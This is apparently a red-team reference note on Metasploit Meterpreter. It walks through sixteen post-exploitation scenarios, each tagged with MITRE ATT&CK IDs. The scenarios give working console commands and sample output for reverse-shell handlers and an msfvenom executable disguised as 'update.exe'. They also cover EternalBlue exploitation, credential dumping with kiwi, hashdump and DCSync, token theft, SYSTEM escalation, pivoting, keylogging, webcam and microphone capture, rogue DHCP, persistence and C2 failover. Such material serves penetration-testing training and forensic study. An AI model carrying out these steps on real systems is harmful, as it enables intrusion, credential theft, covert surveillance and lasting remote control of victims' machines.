# Metasploit — Meterpreter — Hands-On Use Cases

Every scenario below assumes Meterpreter has already arrived on the target through some delivery step (an exploit module, a manually-run `msfvenom`-generated file, or another tool chaining into it) unless the scenario *is* that delivery step. MITRE ATT&CK ID(s) are tagged per scenario since the technique classification shifts with what's actually happening on the wire/in memory.

## Contents
- [Initial Staged Shell via an Exploit Handler](#initial-staged-shell-via-an-exploit-handler)
- [Stageless Payload for Constrained Egress](#stageless-payload-for-constrained-egress)
- [Migrating to a Stable Process](#migrating-to-a-stable-process)
- [Credential Harvesting via Kiwi (In-Memory Mimikatz)](#credential-harvesting-via-kiwi-in-memory-mimikatz)
- [Credential Harvesting via hashdump](#credential-harvesting-via-hashdump)
- [Token Impersonation via Incognito](#token-impersonation-via-incognito)
- [Privilege Escalation with getsystem](#privilege-escalation-with-getsystem)
- [Network Pivoting and Port Forwarding](#network-pivoting-and-port-forwarding)
- [Screenshot and Keylogging Surveillance](#screenshot-and-keylogging-surveillance)
- [Webcam and Microphone Capture](#webcam-and-microphone-capture)
- [Extended Enumeration via extapi](#extended-enumeration-via-extapi)
- [LAN-Local Attacks via lanattacks](#lan-local-attacks-via-lanattacks)
- [Establishing Persistence from a Session](#establishing-persistence-from-a-session)
- [Transport Hopping and Failover](#transport-hopping-and-failover)
- [Chained Directly from an Exploit Module](#chained-directly-from-an-exploit-module)
- [Fleet-Wide Post-Exploitation Across Sessions](#fleet-wide-post-exploitation-across-sessions)

---

## Initial Staged Shell via an Exploit Handler

**MITRE ATT&CK:** [T1105](https://attack.mitre.org/techniques/T1105/) (Ingress Tool Transfer — the stage1 download) · [T1071.001](https://attack.mitre.org/techniques/T1071/001/) (Application Layer Protocol: Web Protocols, if using `reverse_https`/`reverse_http`)

The baseline case: standing up a listener (`exploit/multi/handler`) to catch a staged Meterpreter payload delivered by any exploit module or dropper.

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.1
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j -z
```
`-j` backgrounds the handler as a job so it keeps listening for multiple callbacks; `-z` doesn't auto-interact with the first session that connects. Once the target runs the matching `stage0` stub (delivered separately — by an exploit, or a `msfvenom`-generated file), the handler receives the callback and pulls down `stage1` (the full `metsrv.dll`) automatically — see `01 - Overview.md`'s How It Works diagram.

## Stageless Payload for Constrained Egress

**MITRE ATT&CK:** [T1204.002](https://attack.mitre.org/techniques/T1204/002/) (User Execution: Malicious File, if delivered as a standalone executable) · T1071.001

Used when the target environment won't reliably support a second outbound connection for the stage1 download (aggressive egress filtering, unstable link) or when the delivery mechanism only gets one shot at execution.

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.1
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j -z
```
Note the payload path — `meterpreter_reverse_tcp` (underscore), not `meterpreter/reverse_tcp` (slash). The corresponding standalone file is generated with `msfvenom`, e.g. `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f exe -o update.exe` — full coverage of encoders/output formats lives in `../msfvenom/`. The entire Meterpreter DLL ships inside that one file — there's no separate network fetch of `metsrv.dll` at connect time.

## Migrating to a Stable Process

**MITRE ATT&CK:** [T1055](https://attack.mitre.org/techniques/T1055/) (Process Injection) — closest official sub-technique is [T1055.001](https://attack.mitre.org/techniques/T1055/001/) (Dynamic-link Library Injection), though Meterpreter's own loader is reflective (self-mapping) rather than a classic `LoadLibrary`-based injection

```
meterpreter > ps

PID   PPID  Name            Arch  Session  User
---   ----  ----            ----  -------  ----
2244  1044  explorer.exe    x64   1        CORP\jsmith
3108  652   svchost.exe     x64   0        NT AUTHORITY\SYSTEM

meterpreter > migrate 2244
[*] Migrating from 4012 to 2244...
[*] Migration completed successfully.
meterpreter > getpid
Current pid: 2244
```
Migrating out of the process the payload was originally dropped/executed in (which is often short-lived, or a suspicious-looking one like a phishing macro's spawned `wscript.exe`) and into a long-lived process improves session survivability — if the original process is closed by the user or terminated by EDR, the session dies with it. See `01 - Overview.md`'s How It Works for the `OpenProcess`/`VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread` injection sequence this triggers. **Forensically, this is the single most important operational choice a Meterpreter operator makes**: every artifact tied to the payload's *original* process (its parent, its command line, any file it was launched from) becomes stale the moment `migrate` succeeds — an analyst who finds Meterpreter's network traffic coming from `explorer.exe` and stops there, without checking for a prior injection event, will miss the actual delivery chain entirely.

## Credential Harvesting via Kiwi (In-Memory Mimikatz)

**MITRE ATT&CK:** [T1003.001](https://attack.mitre.org/techniques/T1003/001/) (OS Credential Dumping: LSASS Memory)

```
meterpreter > load kiwi
Loading extension kiwi...Success.
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============
...
wdigest credentials
====================
...
meterpreter > lsa_dump_sam
meterpreter > dcsync krbtgt
```
`kiwi` reimplements Mimikatz's core credential-extraction routines as a Meterpreter extension DLL, loaded the same reflective way as `metsrv.dll` itself — no separate `mimikatz.exe` binary ever touches the target. `creds_all` is the one-shot wrapper across MSV, WDigest, Kerberos, SSP, and TSPKG security packages; `dcsync` performs a DCSync-style extraction directly from a session with appropriate domain rights, without needing `secretsdump.py` or a real domain controller shell. **This note deliberately doesn't re-explain what these credential providers hold or why** — see `../../Mimikatz/00 - Mimikatz Overview.md` and `../../Mimikatz/sekurlsa (Credential Dumping)/` for the underlying LSASS-memory mechanics; kiwi's commands are a thin Meterpreter-native wrapper around the same techniques.

## Credential Harvesting via hashdump

**MITRE ATT&CK:** [T1003.002](https://attack.mitre.org/techniques/T1003/002/) (OS Credential Dumping: Security Account Manager)

```
meterpreter > load priv
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
jsmith:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
```
`hashdump` is an in-memory reimplementation of the classic `pwdump` approach — it allocates memory inside a target process, injects code to read the SAM database's contents directly out of memory (bypassing the on-disk hive file's normal locking/ACLs), and returns NTLM hash material for every local account. This is the faster, no-extension path to local hashes when `kiwi`'s broader credential surface isn't needed.

## Token Impersonation via Incognito

**MITRE ATT&CK:** [T1134.001](https://attack.mitre.org/techniques/T1134/001/) (Access Token Manipulation: Token Impersonation/Theft)

```
meterpreter > load incognito
meterpreter > list_tokens -u

Delegation Tokens Available
============================
CORP\Administrator
NT AUTHORITY\SYSTEM

meterpreter > impersonate_token "CORP\\Administrator"
[+] Delegation token available
[+] Successfully impersonated user CORP\Administrator
meterpreter > getuid
Server username: CORP\Administrator
meterpreter > rev2self
```
`incognito` (originally a standalone tool, later folded into Meterpreter) enumerates Windows access tokens present on the host — often left behind by other logged-on users or services — and lets the operator impersonate one directly, inheriting that identity's rights without needing its password or hash. `rev2self` drops the impersonation and returns to the session's original security context.

## Privilege Escalation with getsystem

**MITRE ATT&CK:** T1134.001 (named-pipe impersonation techniques) — token duplication technique also maps to [T1068](https://attack.mitre.org/techniques/T1068/) (Exploitation for Privilege Escalation) in some mappings, though it's abuse of legitimate token APIs rather than a vulnerability

```
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
`getsystem` with no arguments tries each built-in technique in order and stops at the first success. The three techniques, forceable individually with `-t <N>` (verified against Rapid7's `meterpreter-getsystem` documentation):

| `-t` | Technique | Mechanics |
|---|---|---|
| 1 (default first) | Named Pipe Impersonation (In Memory/Admin) | Creates a named pipe and spawns `cmd.exe` under `NT AUTHORITY\SYSTEM` that connects back to it; Meterpreter calls `ImpersonateNamedPipeClient` to inherit that SYSTEM security context. Entirely in memory. Requires an administrator account and fails if UAC is actively blocking the underlying service-creation step |
| 2 | Named Pipe Impersonation (Dropper/Admin) | Same idea as technique 1, but instead of an in-memory `cmd.exe`, a DLL is written to disk and executed via `rundll32.exe` as SYSTEM; the DLL connects back to the same named pipe and is impersonated the same way. The fallback when technique 1's fully in-memory path doesn't work — and **the one technique that leaves a file on disk** (see `04 - Target Evidence.md`) |
| 3 | Token Duplication (In Memory/Admin) | Requires `SeDebugPrivilege`. Scans running services for one already running as SYSTEM, reflectively injects `elevator.dll` into it, extracts its SYSTEM token, and duplicates it into the current Meterpreter session. **x86 only** per Rapid7's documentation |

## Network Pivoting and Port Forwarding

**MITRE ATT&CK:** [T1090.001](https://attack.mitre.org/techniques/T1090/001/) (Proxy: Internal Proxy) · [T1572](https://attack.mitre.org/techniques/T1572/) (Protocol Tunneling)

```
meterpreter > run autoroute -s 172.16.5.0/24
[*] Adding a route to 172.16.5.0/255.255.255.0...

meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.5.20
[*] Local TCP relay created: 127.0.0.1:3389 <-> 172.16.5.20:3389
```
`run autoroute` (a post module wrapping the underlying `route` command) tells the Framework to send traffic for a given subnet through the compromised session, turning it into a pivot point for scanning/exploiting hosts the operator's box can't reach directly — every subsequent module or auxiliary scan run against that subnet is transparently tunneled through the session's own TLV channel. `portfwd` sets up a specific local-port-to-remote-service relay through the same session — e.g. tunneling RDP to an internal host through the compromised pivot.

## Screenshot and Keylogging Surveillance

**MITRE ATT&CK:** [T1113](https://attack.mitre.org/techniques/T1113/) (Screen Capture) · [T1056.001](https://attack.mitre.org/techniques/T1056/001/) (Input Capture: Keylogging)

```
meterpreter > screenshot
Screenshot saved to: /home/operator/loot/JsFsVhWz.jpeg

meterpreter > keyscan_start
Starting the keystroke sniffer...
meterpreter > keyscan_dump
Dumping captured keystrokes...
jsmith logged in — typed: Summer2026!
meterpreter > keyscan_stop
```
Both run in the context of whatever process Meterpreter currently occupies — `keyscan_start` hooks the current desktop session's input, so migrating into a process running in the interactive user's session (e.g. `explorer.exe`) first is usually necessary for it to capture anything.

## Webcam and Microphone Capture

**MITRE ATT&CK:** [T1125](https://attack.mitre.org/techniques/T1125/) (Video Capture) · [T1123](https://attack.mitre.org/techniques/T1123/) (Audio Capture)

```
meterpreter > webcam_list
1: Integrated Webcam

meterpreter > webcam_snap -i 1
[*] Starting...
[+] Got frame
Webcam shot saved to: /home/operator/loot/webcam_snap.jpeg

meterpreter > record_mic -d 30
[*] Starting...
Audio saved to: /home/operator/loot/audio_20260801.wav
```
Both are `stdapi` commands — no separate `load` step needed. `webcam_snap` grabs a single still; `webcam_stream` (not shown) pushes a continuous MJPEG stream back to the operator instead. `record_mic -d <seconds>` captures a fixed-duration audio clip from whichever microphone the OS reports as default. Like keylogging, these physically depend on the process Meterpreter occupies having access to the interactive desktop session — a `migrate` into a background service process will typically fail to enumerate a webcam/mic at all.

## Extended Enumeration via extapi

**MITRE ATT&CK:** [T1087.002](https://attack.mitre.org/techniques/T1087/002/) (Account Discovery: Domain Account, for `adsi`) · [T1115](https://attack.mitre.org/techniques/T1115/) (Clipboard Data) · [T1552](https://attack.mitre.org/techniques/T1552/) (Unsecured Credentials, for `ntds_parse`/`pageant`)

```
meterpreter > load extapi
Loading extension extapi...Success.

meterpreter > adsi_domain_query -d corp.local -f "(objectClass=user)" -l samaccountname
meterpreter > clipboard_monitor_start
[*] Clipboard monitor started...
meterpreter > clipboard_monitor_dump
meterpreter > window_enum
```
`extapi` bundles the capability that doesn't cleanly fit `stdapi`'s filesystem/process/network scope: direct ADSI-based Active Directory queries without dropping a separate LDAP tool, a continuous clipboard monitor (useful for catching a user pasting a password manager entry or a one-time token), offline `NTDS.dit` parsing once a copy has been pulled elsewhere in the session, PuTTY Pageant SSH-agent hijacking, Windows service control, and WMI queries. It's the extension operators reach for when the target is a domain-joined workstation and the goal is silent enumeration rather than active credential dumping.

## LAN-Local Attacks via lanattacks

**MITRE ATT&CK:** [T1557](https://attack.mitre.org/techniques/T1557/) (Adversary-in-the-Middle) — closest sub-technique is network-protocol poisoning, though `lanattacks`' DHCP spoofing isn't yet a named ATT&CK sub-technique in its own right

```
meterpreter > load lanattacks
meterpreter > dhcp_set_option ROUTER 172.16.5.1
meterpreter > dhcp_set_option DNSSERVER 172.16.5.1
meterpreter > dhcp_start
[*] Sending DHCP offers with router 172.16.5.1, DNS 172.16.5.1
```
`lanattacks` turns the compromised host itself into a rogue-DHCP platform against its own local broadcast segment — useful once a foothold on one internal segment needs to expand laterally without the operator's own infrastructure ever touching that segment's traffic. This is functionally similar in intent to `Responder/`'s poisoning attacks, but launched **from inside the target network via an existing Meterpreter session** rather than from an operator-controlled box physically or VPN-connected to the segment. A bundled TFTP server component supports PXE-style delivery scenarios on the same theme.

## Establishing Persistence from a Session

**MITRE ATT&CK:** [T1547.001](https://attack.mitre.org/techniques/T1547/001/) (Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder) — exact sub-technique depends on the persistence mechanism chosen

```
meterpreter > background
msf6 > use exploit/windows/local/persistence
msf6 exploit(windows/local/persistence) > set SESSION 1
msf6 exploit(windows/local/persistence) > set STARTUP USER
msf6 exploit(windows/local/persistence) > run
[*] Persistent agent script is at C:\Users\jsmith\AppData\Local\Temp\wJnKddF.vbs
```
Persistence isn't a Meterpreter console command itself — it's a `post`/`local` module run against a backgrounded session, which drops a launcher (VBScript, registry Run key, or scheduled task depending on the module/options chosen) that re-establishes a Meterpreter callback on a trigger (logon, reboot, interval). This is the point where the target's evidence trail gains a persistence-mechanism artifact on top of the in-memory Meterpreter footprint — see `04 - Target Evidence.md`.

## Transport Hopping and Failover

**MITRE ATT&CK:** [T1008](https://attack.mitre.org/techniques/T1008/) (Fallback Channels)

```
meterpreter > transport list
1: reverse_tcp   10.10.14.1:4444    (current)

meterpreter > transport add -t reverse_https -l 10.10.14.1 -p 8443
[*] Adding new transport ...
[*] Successfully added reverse_https transport.

meterpreter > transport next
[*] Changing to next transport ...
```
A live session can carry multiple registered transports and switch between them (`transport next`/`transport prev`/`transport change`) without dropping — useful if a primary C2 channel gets blocked mid-engagement, and Meterpreter will automatically cycle to the next configured transport if communication on the current one fails outright. Operators commonly register a `reverse_tcp` primary alongside a `reverse_https` fallback specifically because the two have different network-visibility profiles (see `01 - Overview.md`'s transport comparison) — losing the raw-socket channel to a firewall rule doesn't necessarily lose the HTTP(S)-disguised one.

## Chained Directly from an Exploit Module

**MITRE ATT&CK:** [T1210](https://attack.mitre.org/techniques/T1210/) (Exploitation of Remote Services) · T1105 (stage1 download, if staged)

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > set RHOSTS 10.10.10.40
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 10.10.14.1
msf6 exploit(...) > run
[*] Sending stage (200262 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened
```
The most common real-world path: an exploit module gains remote code execution and hands control directly to a Meterpreter payload as part of the same `run` — no separate handler-then-deliver step, because the exploit module itself contains the delivery mechanism (here, an SMBv1 remote code execution bug). Full exploit-module mechanics live in the `Exploit Modules/` sub-tool folder.

## Fleet-Wide Post-Exploitation Across Sessions

**MITRE ATT&CK:** technique tag depends on what's run — the example below is [T1033](https://attack.mitre.org/techniques/T1033/) (System Owner/User Discovery)

```
msf6 > sessions -l
msf6 > sessions -C "getuid"
[*] Session 1 (10.10.10.40): Server username: NT AUTHORITY\SYSTEM
[*] Session 2 (10.10.10.41): Server username: CORP\svc-backup
[*] Session 3 (10.10.10.42): Server username: NT AUTHORITY\SYSTEM
```
`sessions -C "<command>"` broadcasts a single Meterpreter console command across every currently open session — the operational pattern for consistent enumeration or a scripted post module (`sessions -s <module>`) once an engagement has multiple simultaneous compromised hosts, rather than repeating the same command by hand per session.
